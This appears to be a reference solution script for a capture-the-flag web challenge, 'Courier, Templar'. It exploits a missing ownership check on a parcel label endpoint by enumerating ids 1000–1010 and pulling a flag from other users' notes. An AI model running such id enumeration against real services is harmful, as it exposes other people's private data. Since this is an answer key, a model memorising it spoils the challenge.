// Reference solve — Courier, Templar. The detail route now checks ownership (403), but the label route does not. Open a
// demo session, enumerate the 1xxx id block, and read each foreign parcel's label — the note rides along in the label.
const base = process.argv[2];
const { token } = await (await fetch(`${base}/api/session`, { method: 'POST' })).json();
const auth = { headers: { authorization: `Bearer ${token}` } };
for (let id = 1000; id <= 1010; id++) {
  const r = await fetch(`${base}/api/parcels/${id}/label`, auth);
  if (!r.ok) continue;
  const { note } = await r.json();
  const m = /HVWA\{[a-z2-7]{26}\}/.exec(note ?? '');
  if (m) { console.log(m[0]); break; }
}
